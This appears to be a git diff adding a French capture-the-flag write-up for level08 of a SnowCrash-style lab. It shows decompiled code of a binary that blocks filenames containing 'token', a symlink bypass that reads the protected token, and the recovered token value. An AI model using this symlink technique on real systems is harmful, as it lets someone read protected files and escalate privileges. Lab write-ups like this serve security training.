@@ -1,0 +1,70 @@
+On a deux fichiers: un executable level08 et un fichier token.
+
+On telecharge l'executable pour le lire avec ghidra:
+scp -P 4243 level08@127.0.0.1:/home/user/level08/token .
+
+ghidra nous donne le code:
+
+int main(int argc,char **argv,char **envp) 
+{ 
+  char *pcVar1; 
+  int __fd; 
+  size_t __n; 
+  ssize_t sVar2; 
+  int in_GS_OFFSET; 
+  undefined4 *in_stack_00000008; 
+  int fd; 
+  int rc; 
+  char buf [1024]; 
+  undefined1 local_414 [1024]; 
+  int local_14; 
+  local_14 = *(int *)(in_GS_OFFSET + 0x14); 
+  if (argc == 1) { 
+    printf("%s [file to read]\n",*in_stack_00000008); 
+    /* WARNING: Subroutine does not return */ 
+    exit(1); 
+  } 
+  pcVar1 = strstr((char *)in_stack_00000008[1],"token"); 
+  if (pcVar1 != (char *)0x0) { 
+    printf("You may not access       \'%s\'\n",in_stack_00000008[1]); 
+    /* WARNING: Subroutine does not return */ 
+    exit(1); 
+  } 
+  __fd = open((char *)in_stack_00000008[1],0); 
+  if (__fd == -1) { 
+    err(1,"Unable to open %s",in_stack_00000008[1]); 
+  } 
+  __n = read(__fd,local_414,0x400);
+  if (__n == 0xffffffff) { 
+    err(1,"Unable to read fd %d",__fd);
+   } 
+  sVar2 = write(1,local_414,__n);
+  if (local_14 != *(int *)(in_GS_OFFSET + 0x14)) { 
+    /* WARNING: Subroutine does not return */                 __stack_chk_fail(); 
+  } 
+  return sVar2; 
+}
+
+En gros le programme ouvre un fichier en lecture et affiche son contenu a l'ecran.
+Et ce fichier ne doit pas comporter le mot "token" dans son nom.
+
+Donc on ne peut pas executer le programme avec le fichier token.
+
+On remarque egalement qu'on a aucun droit de lecture / ecriture sur le fichier token
+On decide de creer un lien symbolique vers le fichier token et d'executer le programme.
+Mais on obtient une erreur.
+
+level08@SnowCrash:~$ ln -s token /tmp/file
+level08@SnowCrash:~$ ./level08 /tmp/file
+level08: Unable to open /tmp/file: No such file or directory
+
+on decide de passer le chemin entier au token au moment de la creation du lien symbolique:
+
+level08@SnowCrash:~$ ln -s -v /home/user/level08/token /tmp/fichier
+`/tmp/fichier' -> `/home/user/level08/token'
+level08@SnowCrash:~$ ls -l /tmp/fichier
+lrwxrwxrwx 1 level08 level08 24 Sep 29 11:23 /tmp/fichier -> /home/user/level08/token
+level08@SnowCrash:~$ ./level08 /tmp/fichier
+quif5eloekouj29ke0vouxean
+
+on peut: su flag08 et getflag
